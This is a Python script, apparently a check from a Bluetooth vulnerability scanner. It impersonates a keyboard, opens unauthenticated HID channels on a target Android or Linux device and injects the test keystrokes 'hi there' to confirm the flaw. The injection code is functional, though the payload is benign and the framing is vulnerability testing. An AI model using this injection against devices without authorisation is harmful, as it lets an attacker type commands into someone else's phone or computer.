#!/usr/bin/env python3

import argparse
import re
import time
import os
import sys
from multiprocessing import Process
import threading

from injector.helpers import assert_address, log, run
from injector.client import KeyboardClient
from injector.adapter import Adapter
from injector.profile import register_hid_profile

from sbleedyCLI.report import report_not_vulnerable, report_vulnerable, report_error

stop_event = threading.Event()

def parse_arguments():
    """Parse command line arguments."""
    parser = argparse.ArgumentParser("keystroke-injection-android-linux.py")
    parser.add_argument("-i", "--hci", required=True, help="Bluetooth interface")
    parser.add_argument("-t", "--target", required=True, help="Target MAC address")
    return parser.parse_args()

def setup_adapter(interface, target_address):
    """Set up the Bluetooth adapter and register HID profile."""
    log.status("Configuring Bluetooth adapter")
    adapter = Adapter(interface)
    adapter.set_name("KeyBoah")
    adapter.set_class(0x002540)
    time.sleep(2)
    run(["hcitool", "name", target_address])
    return adapter

def restart_bluetooth_daemon():
    run(["sudo", "service", "bluetooth", "restart"])
    time.sleep(0.5)

def connect_to_sdp(client):
    """Connect to the Service Discovery Protocol on the target."""
    timeout = 10
    start_time = time.time()
    log.status("Connecting to SDP")

    while not client.connect_sdp() and not stop_event.is_set():
        elapsed_time = time.time() - start_time
        if elapsed_time > timeout:
            log.error("Failed to connect to SDP within the timeout period")
            report_not_vulnerable("Device didn't allow connection to SDP")
            stop_event.set()
            return  # Exit if the connection fails and stop_event is set

        log.debug("Connecting to SDP")
        time.sleep(0.1)

    if not stop_event.is_set():
        log.success("Connected to SDP (L2CAP 1) on target")
    else:
        log.error("Failed to connect to SDP or stopped prematurely.")


def connect_hid_services(client):
    """Connect to HID Interrupt and HID Control services on the target."""
    if stop_event.is_set():
        return
    
    timeout = 10
    log.status("Connecting to HID Interrupt and HID Control services")

    client.connect_hid_interrupt()
    client.connect_hid_control()

    start = time.time()
    while (time.time() - start) < 1 and not stop_event.is_set():
        if not client.c17.connected or not client.c19.connected:
            break
        time.sleep(0.001)

    if not client.c19.connected and not stop_event.is_set():
        log.status("Connecting to HID Interrupt")
        while not client.connect_hid_interrupt() and not stop_event.is_set():
            elapsed_time = time.time() - start
            if elapsed_time > timeout:
                log.error("Failed to connect to HID Interrupt within the timeout period")
                report_not_vulnerable("Device didn't allow connection to HID Interrupt")
                stop_event.set()
                return  # Exit if the connection fails and stop_event is set
            log.debug("Connecting to HID Interrupt")
            time.sleep(0.001)
    if not stop_event.is_set():
        log.success("Connected to HID Interrupt (L2CAP 19) on target")

    if not client.c17.connected and not stop_event.is_set():
        log.status("Connecting to HID Control")
        while not client.connect_hid_control() and not stop_event.is_set():
            elapsed_time = time.time() - start
            if elapsed_time > timeout:
                log.error("Failed to connect to HID Control within the timeout period")
                report_not_vulnerable("Device didn't allow connection to HID Control")
                stop_event.set()
                return  # Exit if the connection fails and stop_event is set
            log.debug("Connecting to HID Control")
            time.sleep(0.001)
    if not stop_event.is_set():
        log.success("Connected to HID Control (L2CAP 17) on target")

def monitor_stop_event(adapter, client, profile_proc):
    """Monitor the stop_event and call cleanup when it's set."""
    while not stop_event.is_set():
        time.sleep(1)  # Check every 1s

    # Cleanup
    if client:
        log.status("Closing Bluetooth HID client")
        client.close()

    if adapter:
        log.status("Taking adapter offline")
        adapter.down()

    if profile_proc and profile_proc.is_alive():
        log.status("Terminating HID profile process")
        profile_proc.terminate()

    sys.exit(1)

def main():
    """Main function to execute the script."""
    global stop_event
    stop_event.clear()

    args = parse_arguments()

    assert_address(args.target)
    assert(re.match(r"^hci\d+$", args.hci))
    
    restart_bluetooth_daemon()

    # Register HID profile
    profile_proc = Process(target=register_hid_profile, args=(args.hci, args.target))
    profile_proc.start()

    # Set up adapter
    adapter = setup_adapter(args.hci, args.target)

    # Initialize client
    client = KeyboardClient(args.target, auto_ack=True)
    
    # Start monitoring thread
    stop_event_thread = threading.Thread(target=monitor_stop_event, args=(adapter, client, profile_proc))
    stop_event_thread.start()
    
    # Connect to SDP
    connect_to_sdp(client)

    # Check if the stop_event was set during SDP connection
    if stop_event.is_set():
        log.error("Stopping execution due to failure in connecting to SDP.")
        log.info("Apparently the target isn't vulnerable to this attack. Stopping now.")
        stop_event.set()
        stop_event_thread.join()  # Ensure cleanup thread finishes
        return

    # Proceed if SDP connection was successful
    adapter.enable_ssp()
    connect_hid_services(client)

    # Send an empty keyboard report
    if client is not None:
        client.send_keyboard_report()

    # Handle payload
    log.info("Injecting payload")
    try:
        if client is not None and not stop_event.is_set():
            client.send_ascii("hi there")
            time.sleep(2)
            report_vulnerable("Key injection worked")
    except KeyboardInterrupt:
        log.error("Keyboard interrupt")

    stop_event.set()
    stop_event_thread.join()

if __name__ == "__main__":
    main()